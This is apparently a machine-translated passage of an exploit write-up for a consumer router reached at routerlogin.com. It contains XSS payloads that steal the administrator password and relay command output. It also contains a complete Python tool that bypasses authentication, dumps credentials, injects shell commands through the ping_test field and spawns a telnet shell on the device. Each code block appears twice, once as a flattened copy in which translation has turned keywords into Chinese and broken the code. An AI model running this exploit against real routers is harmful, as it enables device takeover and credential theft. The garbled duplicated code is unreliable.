////转储管理员的密码。//功能转储密码（）{ // // 这是允许我们将数据泄露到攻击者网站的 XSS 有效负载。 // 如果没有它，CORS 将阻止我们读取内容并泄露凭据。 // 一旦完成，它会向父窗口发送一条消息，非常有礼貌。 // const payload = ` fetch ( '/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm' ) 。然后( r= > r. text ()) 。然后( r= > parent.postMessage ( r , '*' )) 。catch ( r= > parent.postMessage ( '失败' , ' *' )) `; 返回执行（有效载荷）。然后( R = > { const [ loginMatch, pwdMatch ] = R.matchAll ( /Router Admin ( ?:Username|Password )< \/span > :  ( .+ )< \/td > /g ) ; 返回{ '登录' :loginMatch [ 1 ] , 'pwd' :pwdMatch [ 1 ]} ; }) ;}// // Dump the passwords of the administrator. // function dumpPasswords() { // // This is the XSS payload that allows us to exfiltrate data to the attacker website. // Without it CORS would prevent us from reading the content and leaking the creds. // Once it is finished it sends a message to the parent window, so polite. // const payload = `fetch('/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm').then(r=>r.text()).then(r=>parent.postMessage(r, '*')).catch(r=>parent.postMessage('failed','*'))`; return execute(payload).then(R => { const [loginMatch, pwdMatch] = R.matchAll(/Router Admin (?:Username|Password)<\/span>:&nbsp;(.+)<\/td>/g); return {'login':loginMatch[1], 'pwd':pwdMatch[1]}; }); }

```
//
// Dump the passwords of the administrator.
//

function dumpPasswords() {

  //
  // This is the XSS payload that allows us to exfiltrate data to the attacker website.
  // Without it CORS would prevent us from reading the content and leaking the creds.
  // Once it is finished it sends a message to the parent window, so polite.
  //

  const payload = `fetch('/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm').then(r=>r.text()).then(r=>parent.postMessage(r, '*')).catch(r=>parent.postMessage('failed','*'))`;
  return execute(payload).then(R => {
    const [loginMatch, pwdMatch] = R.matchAll(/Router Admin (?:Username|Password)<\/span>:&nbsp;(.+)<\/td>/g);
    return {'login':loginMatch[1], 'pwd':pwdMatch[1]};
  });
}
```

以及读取在目标上执行的任意命令的结果：

//// 在路由器上执行 shell 命令。//函数执行命令（命令）{ if ( command.includes ( ' ; ' ) || command.includes ( ' - ' )) { throw '不能注入 ";" 或“-”' ； } // // 这是允许我们将数据泄露到攻击者网站的 XSS 有效负载。 // 如果没有它，CORS 将阻止我们读取内容并泄露凭据。 // 一旦完成，它会向父窗口发送一条消息，非常有礼貌。 // const payload = "parent.postMessage(document.body.outerHTML,'*')" ; const commands = [ '/bin/echo BEGIN' , command, '/bin/echo END' ] ; 返回执行（有效载荷，命令）。那么( r = > { 常量[ _, 结果] = r。匹配( /BEGIN\ n ( .+ ) \nEND/s ) ; 返回结果； }) ;}// // Execute a shell command on the router. // function executeCommand(command) { if (command.includes(';') || command.includes('-')) { throw 'cannot inject ";" or "-"'; } // // This is the XSS payload that allows us to exfiltrate data to the attacker website. // Without it CORS would prevent us from reading the content and leaking the creds. // Once it is finished it sends a message to the parent window, so polite. // const payload = "parent.postMessage(document.body.outerHTML,'*')"; const commands = ['/bin/echo BEGIN', command, '/bin/echo END']; return execute(payload, commands).then(r => { const [_, result] = r.match(/BEGIN\n(.+)\nEND/s); return result; }); }

```
//
// 在路由器上执行 shell 命令。
//

功能执行命令（命令）{
  if (command.includes(';') || command.includes('-')) {
    throw '不能注入 ";" 要么 ”-”';
  }

  //
  // 这是允许我们将数据泄露到攻击者网站的 XSS 有效负载。
  // 如果没有它，CORS 将阻止我们读取内容并泄露凭据。
  // 一旦完成，它会向父窗口发送一条消息，非常有礼貌。
  //

  常量负载 = “parent.postMessage(document.body.outerHTML,'*')”;
  const commands = ['/bin/echo BEGIN', command, '/bin/echo END'];
  返回执行（有效负载，命令）。然后（r => {
    const [_, 结果] = r.match(/BEGIN\n(.+)\nEND/s);
    返回结果；
  });
}
```

**开发**

导入请求重新进口导入线程导入telnetlib进口时间导入参数解析def dump_http_pwd （目标）： '''绕过身份验证并检索访问所需的凭据 管理面板。''' r = 请求。获取( f 'http://{target}/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm' ) 内容 = r.content。解码() 登录，密码=重新。findall ( r 'Router Admin (?:Username|Password)</span>: (.+)</td>' , content ) 返回登录名，密码def cmd_exec （目标，cmd，静默=假）： '''绕过认证和命令注入`cmd`。''' r = 请求。发布（ f 'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm' , { “待办事项” ：“ping_test” ， 'c4_IPAddr' : f '127.0.0.1 && echo SNIPME && {cmd}' , 'next_file' ：'diagping.htm' }) 内容 = r.content。解码() ping_log =重新。找到所有（ r '<textarea .+ 只读 >(.+)</textarea>' , 内容， re.DOTALL ) _，cmd_content = ping_log [ 0 ] 。拆分（'SNIPME' ，1 ） 如果不沉默： 打印（cmd_content.strip （ ））def spawn_telnetd （目标）： '''生成 telnet 服务器。''' cmd_exec (目标, '/bin/utelnetd' , 静默 = True )定义主（）： 解析器 = argparse。ArgumentParser ( 'Longue vue' ) 解析器。add_argument ( '--dump-pwd' , action = 'store_true' , default = False ) 解析器。add_argument ( '--shell' , action = 'store_true' , default = False ) 解析器。add_argument ( '--cmd' ) 解析器。add_argument ( '--target' , 默认 = 'routerlogin.com' ) args = 解析器。parse_args () 如果不是args.dump_pwd而不是args.shell而不是args.cmd： 解析器。打印帮助（） 返回 如果args.dump_pwd： print ( '正在转储管理密码...' ) 登录，密码 = dump_http_pwd ( args.target ) print ( f '登录名: {repr(login)}, 密码: {repr(pwd)}' ) 如果args.cmd不是None ：_ 如果args.cmd中的 '-'或';' 在args.cmd 中： print ( '命令注入错误不允许使用 "-" 和 ";"，请改用 shell。' ) 返回 print ( f '针对 {args.target} 执行 {repr(args.cmd)} ..' ) cmd_exec ( args.target, args.cmd ) 如果args.shell： print ( f '得到一个针对 {args.target} 的 shell ..' ) telnetd = 线程。线程（目标 = spawn_telnetd，args = （args.target，）） 远程登录。开始（） print ( '连接前等待几秒钟..' ) 时间。睡觉( 5 ) print ( '进入shell，ctrl+c退出' ) 尝试： 使用telnetlib。Telnet ( args.target )作为tn： 吨。mt_interact () 除了： 经过 print ( '清理..' ) cmd_exec ( args.target, '/bin/kill $(/bin/pidof utelnetd)' , silent = True ) print ( '加入..' ) 远程登录。加入（） 打印（'完成' 。中心（60 ，'-' ））主要（）import requests import re import threading import telnetlib import time import argparse def dump_http_pwd(target): '''Bypass authentication and retrieve credentials needed to access the administration panel.''' r = requests.get(f'http://{target}/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm') content = r.content.decode() login, pwd = re.findall(r'Router Admin (?:Username|Password)</span>:&nbsp;(.+)</td>', content) return login, pwd def cmd_exec(target, cmd, silent = False): '''Bypass authentication and command inject `cmd`.''' r = requests.post( f'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm', { 'todo' : 'ping_test', 'c4_IPAddr' : f'127.0.0.1 && echo SNIPME && {cmd}', 'next_file' : 'diagping.htm' }) content = r.content.decode() ping_log = re.findall( r'<textarea .+ readonly >(.+)</textarea>', content, re.DOTALL ) _, cmd_content = ping_log[0].split('SNIPME', 1) if not silent: print(cmd_content.strip()) def spawn_telnetd(target): '''Spawn the telnet server.''' cmd_exec(target, '/bin/utelnetd', silent = True) def main(): parser = argparse.ArgumentParser('Longue vue') parser.add_argument('--dump-pwd', action = 'store_true', default = False) parser.add_argument('--shell', action = 'store_true', default = False) parser.add_argument('--cmd') parser.add_argument('--target', default = 'routerlogin.com') args = parser.parse_args() if not args.dump_pwd and not args.shell and not args.cmd: parser.print_help() return if args.dump_pwd: print('Dumping administration password...') login, pwd = dump_http_pwd(args.target) print(f'Login: {repr(login)}, Password: {repr(pwd)}') if args.cmd is not None: if '-' in args.cmd or ';' in args.cmd: print('Both "-" and ";" are disallowed by the command injection bug, use the shell instead.') return print(f'Executing {repr(args.cmd)} against {args.target}..') cmd_exec(args.target, args.cmd) if args.shell: print(f'Getting a shell against {args.target}..') telnetd = threading.Thread(target = spawn_telnetd, args = (args.target, )) telnetd.start() print('Waiting a few seconds before connecting..') time.sleep(5) print('Dropping in the shell, exit with ctrl+c') try: with telnetlib.Telnet(args.target) as tn: tn.mt_interact() except: pass print('Cleaning up..') cmd_exec(args.target, '/bin/kill $(/bin/pidof utelnetd)', silent = True) print('Joining..') telnetd.join() print('Done'.center(60, '-')) main()

```
import requests
import re
import threading
import telnetlib
import time
import argparse

def dump_http_pwd(target):
    '''Bypass authentication and retrieve credentials needed to access
    the administration panel.'''
    r = requests.get(f'http://{target}/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm')
    content = r.content.decode()
    login, pwd = re.findall(r'Router Admin (?:Username|Password)</span>:&nbsp;(.+)</td>', content)
    return login, pwd

def cmd_exec(target, cmd, silent = False):
    '''Bypass authentication and command inject `cmd`.'''
    r = requests.post(
        f'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm', {
        'todo' : 'ping_test',
        'c4_IPAddr' : f'127.0.0.1 && echo SNIPME && {cmd}',
        'next_file' : 'diagping.htm'
    })

    content = r.content.decode()
    ping_log = re.findall(
        r'<textarea  .+ readonly >(.+)</textarea>',
        content,
        re.DOTALL
    )
    _, cmd_content = ping_log[0].split('SNIPME', 1)
    if not silent:
        print(cmd_content.strip())

def spawn_telnetd(target):
    '''Spawn the telnet server.'''
    cmd_exec(target, '/bin/utelnetd', silent = True)

def main():
    parser = argparse.ArgumentParser('Longue vue')
    parser.add_argument('--dump-pwd', action = 'store_true', default = False)
    parser.add_argument('--shell', action = 'store_true', default = False)
    parser.add_argument('--cmd')
    parser.add_argument('--target', default = 'routerlogin.com')
    args = parser.parse_args()

    if not args.dump_pwd and not args.shell and not args.cmd:
        parser.print_help()
        return

    if args.dump_pwd:
        print('Dumping administration password...')
        login, pwd = dump_http_pwd(args.target)
        print(f'Login: {repr(login)}, Password: {repr(pwd)}')

    if args.cmd is not None:
        if '-' in args.cmd or ';' in args.cmd:
            print('Both "-" and ";" are disallowed by the command injection bug, use the shell instead.')
            return

        print(f'Executing {repr(args.cmd)} against {args.target}..')
        cmd_exec(args.target, args.cmd)

    if args.shell:
        print(f'Getting a shell against {args.target}..')
        telnetd = threading.Thread(target = spawn_telnetd, args = (args.target, ))
        telnetd.start()
        print('Waiting a few seconds before connecting..')
        time.sleep(5)
        print('Dropping in the shell, exit with ctrl+c')
        try:
            with telnetlib.Telnet(args.target) as tn:
                tn.mt_interact()
        except:
            pass

        print('Cleaning up..')
        cmd_exec(args.target, '/bin/kill $(/bin/pidof utelnetd)', silent = True)
        print('Joining..')
        telnetd.join()

    print('Done'.center(60, '-'))

main()
```